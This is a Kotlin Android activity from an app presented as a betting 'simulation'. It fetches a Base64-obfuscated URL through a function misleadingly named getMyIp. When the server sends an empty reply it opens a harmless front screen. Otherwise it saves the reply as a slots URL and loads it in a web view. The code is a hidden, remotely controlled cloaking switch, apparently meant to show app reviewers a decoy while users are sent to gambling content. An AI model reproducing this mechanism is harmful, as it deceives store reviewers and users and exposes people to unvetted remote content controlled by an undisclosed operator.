package com.BELAIBET.simulation

import android.animation.ObjectAnimator
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.BELAIBET.simulation.front.FrontActivity
import com.BELAIBET.simulation.web.WebActivityBelai
import com.android.volley.Request
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.google.android.material.progressindicator.LinearProgressIndicator
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking


class OperateActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceStateBelai: Bundle?) {
        super.onCreate(savedInstanceStateBelai)
        setContentView(R.layout.loading_activity)
        val sPref = applicationContext.getSharedPreferences("MyPref_belaibet", 0)
        val editorBelai = sPref.edit()
        val constProg= "progress"



        val loadLineBelai: LinearProgressIndicator = findViewById(R.id.loading_line_belaibet)
        val animatorBelai = ObjectAnimator.ofInt(loadLineBelai, constProg, loadLineBelai.progress, 100)
        animatorBelai.duration = 2000
        animatorBelai.start()



//                if(false)
        Handler(Looper.getMainLooper()).postDelayed({
            runBlocking {
            try {
                getMyIp(object : ApiResponse {
                    override fun onSuccess(responseBelai: String) {
                        lifecycleScope.launch(Dispatchers.Main) {
                            Log.e("textFromSite_belaibet", responseBelai)
                            if (responseBelai == "<html><style>body{margin:0}</style><body></body></html>" || responseBelai.isEmpty())
                                startActivity(Intent(this@OperateActivity, FrontActivity::class.java))
                            else if (responseBelai == "") {
                                startActivity(Intent(this@OperateActivity, FrontActivity::class.java))
                            } else {
                                editorBelai.putString("url_slots", responseBelai)
                                editorBelai.commit()
                                Log.d("afterPut", responseBelai)
                                startActivity(Intent(this@OperateActivity, WebActivityBelai::class.java))
                            }
                            Log.d("textFromSite_belaibet", responseBelai)
                        }
                    }

                    override fun onError() {
                        lifecycleScope.launch(Dispatchers.Main) {
                            startActivity(Intent(this@OperateActivity, FrontActivity::class.java))
                        }
                        Log.d("textFromSite_belaibet", "Error_belaibet")
                    }

                })
            } catch (extraBelai: Exception) {
                Toast.makeText(
                    this@OperateActivity.applicationContext,
                    extraBelai.toString(),
                    Toast.LENGTH_SHORT
                ).show();
            }

        } }, 2000)

//        startActivity(Intent(this@OperateActivity, WebActivity::class.java))
    }
    interface ApiResponse {
        fun onSuccess(responseBelai: String)
        fun onError()
    }

    fun getMyIp(apiResponseBelai: ApiResponse) {
        val queue = Volley.newRequestQueue(this)
        val url = Base64.decode("aHR0cHM6Ly9iYWxlaWEuY2ZkL3pIcWJ5aFJT", Base64.DEFAULT).toString(Charsets.UTF_8)

        val stringRequest = StringRequest(
            Request.Method.GET, url,
            { response ->
                apiResponseBelai.onSuccess(response)
            },
            {
                apiResponseBelai.onError()
            }
        )

        queue.add(stringRequest)
    }

}